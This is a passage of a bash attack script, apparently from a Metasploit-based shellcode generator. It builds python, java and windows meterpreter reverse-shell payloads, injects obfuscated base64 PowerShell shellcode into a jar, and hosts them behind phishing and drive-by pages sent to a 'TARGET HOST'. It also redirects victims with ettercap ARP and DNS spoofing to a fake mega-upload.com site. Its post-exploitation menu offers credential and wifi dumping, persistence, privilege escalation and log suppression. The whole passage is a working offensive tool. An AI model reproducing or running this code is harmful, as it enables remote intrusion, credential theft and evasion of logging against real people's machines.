      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; exploit'"
          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; exploit'"
        fi
      sleep 2


   else


# post-exploitation
P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "enum_system.rc" FALSE "dump_credentials.rc" FALSE "fast_migrate.rc" FALSE "stop_logfiles_creation.rc" FALSE "exploit_suggester.rc" FALSE "linux_hostrecon.rc" FALSE "dump_credentials_linux.rc" --width 305 --height 370) > /dev/null 2>&1


  if [ "$P0" = "stop_logfiles_creation.rc" ]; then
    #
    # check if dependencies exist ..
    #
    if [ -e "$pHanTom/post/windows/manage/Invoke-Phant0m.rb" ]; then
      echo "[☠] Invoke-Phant0m.rb installed .."
      sleep 2
    else
      echo "[x] Invoke-Phant0m.rb not found .."
      sleep 2
      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
      sleep 2
      cp $IPATH/aux/msf/Invoke-Phant0m.rb $pHanTom/post/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
      echo "[☠] Reloading msfdb database .."
      sleep 2
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
    fi

      #
      # check if Invoke-Phantom.ps1 exists ..
      #
      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
        echo "[☠] Invoke-Phant0m.ps1 found .."
        sleep 2
        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
      else
        echo "[x] Invoke-Phant0m.ps1 not found .."
        sleep 2
        echo "[☠] Please place module in $IPATH/aux folder .."
        sleep 2
        exit
      fi
  fi



if [ "$P0" = "dump_credentials_linux.rc" ]; then
  if [ -e "$pHanTom/post/linux/gather/wifi_dump_linux.rb" ]; then
    echo "[✔] wifi_dump_linux.rb -> found"
    sleep 2
  else
    echo "[x] wifi_dump_linux.rb -> not found"
    sleep 1
    echo "    copy post-module to msfdb .."
    cp $IPATH/aux/msf/wifi_dump_linux.rb $pHanTom/post/linux/gather/wifi_dump_linux.rb > /dev/null 2>&1
    echo "[☠] Reloading msfdb database .."
    sleep 2
    xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
    xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
  fi
fi



if [ "$P0" = "linux_hostrecon.rc" ]; then
  if [ -e "$pHanTom/post/linux/gather/linux_hostrecon.rb" ]; then
    echo "[✔] linux_hostrecon.rb -> found"
    sleep 2
  else
    echo "[x] linux_hostrecon.rb -> not found"
    sleep 1
    echo "[*] copy post-module to msfdb .."
    cp $IPATH/aux/msf/linux_hostrecon.rb $pHanTom/post/linux/gather/linux_hostrecon.rb > /dev/null 2>&1
    echo "[☠] Reloading msfdb database .."
    sleep 2
    xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
    xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
  fi
fi



      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m.py|g" mega.html > copy.html
      mv copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m.py $ApAcHe/$N4m.py > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m.py|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m.py $ApAcHe/$N4m.py
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi


        else


        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
          fi
        fi
   fi


sleep 2
# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
mv $IPATH/templates/exec0[bak].py $InJEc9 > /dev/null 2>&1
rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
rm $IPATH/output/chars.raw > /dev/null 2>&1
rm $ApAcHe/$N4m.py > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
sleep 2
clear
cd $IPATH/

else

  echo ${RedF}[x]${white} Abort module execution ..${Reset};
  sleep 2
  sh_multi_menu
  clear
fi
}





# ------------------------------------------------------
# drive-by attack vector JAVA payload.jar
# i have allways dream about this (drive-by-rce)
# using JAVA (affects all operative systems with python)
# -------------------------------------------------------
sh_shellcode18 () {
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
N4m=$(zenity --title="☠ JAR NAME ☠" --text "example: JavaPayload" --entry --width 300) > /dev/null 2>&1
# CHOSE WHAT PAYLOAD TO USE
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\n\nAvailable payloads:" --radiolist --column "Pick" --column "Option" TRUE "java/meterpreter/reverse_tcp (default)" FALSE "windows/meterpreter/reverse_tcp (base64)" --width 380 --height 200) > /dev/null 2>&1


## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$N4m" ]; then N4m="JavaPayload";fi

if [ "$serv" = "java/meterpreter/reverse_tcp (default)" ]; then
echo "[☠] Building shellcode -> java format ..."
sleep 2
# display final settings to user
cat << !

    venom settings
    ──────────────
    LPORT   : $lport
    LHOST   : $lhost
    FORMAT  : JAVA -> MULTI OS
    PAYLOAD : java/meterpreter/reverse_tcp

!

# use metasploit to build shellcode
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p java/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f java > $IPATH/output/$N4m.jar"
# EDITING/BACKUP FILES NEEDED
echo ""
echo "[☠] building raw shellcode..."
sleep 2
echo "[☠] Injecting shellcode -> $N4m.jar!"
sleep 2

# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.jar\n\nchose how to deliver: $N4m.jar" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 240) > /dev/null 2>&1



   if [ "$serv" = "multi-handler (default)" ]; then
     # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
     echo "[☠] Start a multi-handler..."
     echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
     echo "[☯] Please dont test samples on virus total..."
       if [ "$MsFlF" = "ON" ]; then
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD java/meterpreter/reverse_tcp; exploit'"
         cd $IPATH/output
         # delete utf-8/non-ancii caracters from output
         tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
       else
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD java/meterpreter/reverse_tcp; exploit'"
       fi


   else


P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "enum_system.rc" FALSE "dump_credentials.rc" FALSE "fast_migrate.rc" FALSE "persistence.rc" FALSE "privilege_escalation.rc" FALSE "stop_logfiles_creation.rc" FALSE "exploit_suggester.rc" FALSE "linux_hostrecon.rc" FALSE "dump_credentials_linux.rc" --width 305 --height 390) > /dev/null 2>&1


  if [ "$P0" = "stop_logfiles_creation.rc" ]; then
    #
    # check if dependencies exist ..
    #
    if [ -e "$pHanTom/post/windows/manage/Invoke-Phant0m.rb" ]; then
      echo "[☠] Invoke-Phant0m.rb installed .."
      sleep 2
    else
      echo "[x] Invoke-Phant0m.rb not found .."
      sleep 2
      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
      sleep 2
      cp $IPATH/aux/msf/Invoke-Phant0m.rb $pHanTom/post/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
      echo "[☠] Reloading msfdb database .."
      sleep 2
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
    fi

      #
      # check if Invoke-Phantom.ps1 exists ..
      #
      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
        echo "[☠] Invoke-Phant0m.ps1 found .."
        sleep 2
        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
      else
        echo "[x] Invoke-Phant0m.ps1 not found .."
        sleep 2
        echo "[☠] Please place module in $IPATH/aux folder .."
        sleep 2
        exit
      fi
  fi


if [ "$P0" = "linux_hostrecon.rc" ]; then
  if [ -e "$pHanTom/post/linux/gather/linux_hostrecon.rb" ]; then
    echo "[✔] linux_hostrecon.rb -> found"
    sleep 2
  else
    echo "[x] linux_hostrecon.rb -> not found"
    sleep 1
    echo "[*] copy post-module to msfdb .."
    cp $IPATH/aux/msf/linux_hostrecon.rb $pHanTom/post/linux/gather/linux_hostrecon.rb > /dev/null 2>&1
    echo "[☠] Reloading msfdb database .."
    sleep 2
    xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
    xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
  fi
fi


if [ "$P0" = "dump_credentials_linux.rc" ]; then
  if [ -e "$pHanTom/post/linux/gather/wifi_dump_linux.rb" ]; then
    echo "[✔] wifi_dump_linux.rb -> found"
    sleep 2
  else
    echo "[x] wifi_dump_linux.rb -> not found"
    sleep 1
    echo "    copy post-module to msfdb .."
    cp $IPATH/aux/msf/wifi_dump_linux.rb $pHanTom/post/linux/gather/wifi_dump_linux.rb > /dev/null 2>&1
    echo "[☠] Reloading msfdb database .."
    sleep 2
    xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
    xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
  fi
fi


      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc13 driveBy[bak].html
      sed "s|NaM3|http://$lhost:$lport|g" driveBy.html > copy.html
      mv copy.html $ApAcHe/index.html > /dev/null 2>&1
      # copy from output
      cd $IPATH/output
      cp $N4m.jar $ApAcHe/$N4m.jar > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m.jar|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m.jar $ApAcHe/$N4m.jar
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD java/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD java/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi


        else


        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD java/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD java/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
          fi
        fi
   fi

# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
sleep 2
mv $IPATH/templates/phishing/driveBy[bak].html $InJEc13 > /dev/null 2>&1
rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
rm $ApAcHe/$N4m.jar > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
clear
cd $IPATH/



# ------------------------
# build base64 jar payload
# ------------------------
elif [ "$serv" = "windows/meterpreter/reverse_tcp (base64)" ]; then
echo "[☠] Building shellcode -> psh-cmd format ..."
sleep 2
# display final settings to user
cat << !

    venom settings
    ──────────────
    LPORT   : $lport
    LHOST   : $lhost
    FORMAT  : PSH-CMD -> WINDOWS
    PAYLOAD : windows/meterpreter/reverse_tcp

!

# use metasploit to build shellcode
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f psh-cmd > $IPATH/output/chars.raw"


# display shellcode
echo ""
str0=`cat $IPATH/output/chars.raw | awk {'print $12'}`
echo "[☠] obfuscating -> base64 encoded!"
sleep 2
echo $str0
echo ""

# EDITING/BACKUP FILES NEEDED
echo "[☠] editing/backup files..."
cp $IPATH/templates/exec.jar $IPATH/templates/exec[bak].jar
sleep 2
echo "[☠] Injecting shellcode -> $N4m.jar!"
sleep 2
cd $IPATH/templates
sed "s|InJ3C|$str0|" exec.jar > $N4m.jar
mv $N4m.jar $IPATH/output/$N4m.jar


# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.jar\n\nchose how to deliver: $N4m.jar" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 240) > /dev/null 2>&1



   if [ "$serv" = "multi-handler (default)" ]; then
     # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
     echo "[☠] Start a multi-handler..."
     echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
     echo "[☯] Please dont test samples on virus total..."
       if [ "$MsFlF" = "ON" ]; then
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; exploit'"
         cd $IPATH/output
         # delete utf-8/non-ancii caracters from output
         tr -cd '\11\12\15\40-\176' < report.log > final.log
         sed -i "s/\[0m//g" final.log
         sed -i "s/\[1m\[34m//g" final.log
         sed -i "s/\[4m//g" final.log
         sed -i "s/\[K//g" final.log
         sed -i "s/\[1m\[31m//g" final.log
         sed -i "s/\[1m\[32m//g" final.log
         sed -i "s/\[1m\[33m//g" final.log
         mv final.log $N4m-$lhost.log > /dev/null 2>&1
         rm report.log > /dev/null 2>&1
         cd $IPATH/
       else
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; exploit'"
       fi


   else


      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc13 driveBy[bak].html
      sed "s|NaM3|http://$lhost:$lport|g" driveBy.html > copy.html
      mv copy.html $ApAcHe/index.html > /dev/null 2>&1
      # copy from output
      cd $IPATH/output
      cp $N4m.jar $ApAcHe/$N4m.jar > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"
      echo "- THIS ATTACK VECTOR WILL TRIGGER PAYLOAD RCE"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m.jar|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m.jar $ApAcHe/$N4m.jar
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi


        else


        echo "- ATTACK VECTOR: http://$lhost"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; exploit'"
          fi
        fi
   fi

# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
sleep 2
rm $ApAcHe/$N4m.jar > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm $IPATH/output/chars.raw > /dev/null 2>&1
mv $IPATH/templates/exec[bak].jar $InJEc16 > /dev/null 2>&1
mv $IPATH/templates/phishing/driveBy[bak].html $InJEc13 > /dev/null 2>&1
rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
clear
cd $IPATH/



else
# CLEANING EVERYTHING UP
echo "[☠] Cancel button pressed, aborting..."
sleep 2
sh_multi_menu
fi
}






# ---------------------------------------------------------
# WEB_DELIVERY PYTHON/PSH PAYLOADS (msfvenom web_delivery)
# loading from msfconsole the amazing web_delivery module
# writen by: 'Andrew Smith' 'Ben Campbell' 'Chris Campbell'
# this as nothing to do with shellcode, but i LOVE this :D
# ---------------------------------------------------------
sh_shellcode19 () {
# get user input to build the payload
echo "[☆] Enter shellcode settings!"
srvhost=$(zenity --title="☠ Enter SRVHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 4444" --entry --width 300) > /dev/null 2>&1
# CHOSE WHAT PAYLOAD TO USE
PuLK=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Available payloads:" --radiolist --column "Pick" --column "Option" TRUE "python" FALSE "powershell" --width 305 --height 180) > /dev/null 2>&1


## setting default values in case user have skip this ..
if [ -z "$srvhost" ]; then srvhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$PuLK" ]; then PuLK="python";fi


   if [ "$PuLK" = "python" ]; then
   echo "[☠] Building shellcode -> $PuLK format ..."
   sleep 2
   tagett="0"
   filename=$(zenity --title="☠ Enter PAYLOAD name ☠" --text "example: payload" --entry --width 300) > /dev/null 2>&1

# display final settings to user
cat << !

    venom settings
    ──────────────
    LPORT   : $lport
    URIPATH : /SecPatch
    SRVHOST : $srvhost
    FORMAT  : PYTHON -> MULTI OS
    PAYLOAD : python/meterpreter/reverse_tcp
    STORED  : $IPATH/output/$filename.py

!


# EDITING/BACKUP FILES NEEDED
echo ""
echo "[☠] editing/backup files..."
cp $IPATH/templates/web_delivery.py $IPATH/templates/web_delivery[bak].py


   # check if exec.ps1 exists
   if [ -e $IPATH/templates/web_delivery.py ]; then
      echo "[☠] web_delivery.py -> found!"
      sleep 2
 
   else

      echo "[☠] web_delivery.py -> not found!"
      exit
   fi


# edit/backup files nedded
cd $IPATH/templates/
echo "[☠] building -> $filename.py"
sleep 2
# use SED to replace SRVHOST in web_delivery.py
sed "s/SRVHOST/$srvhost/g" web_delivery.py > $filename.py
mv $filename.py $IPATH/output/$filename.py
chmod +x $IPATH/output/$filename.py



# post-exploitation
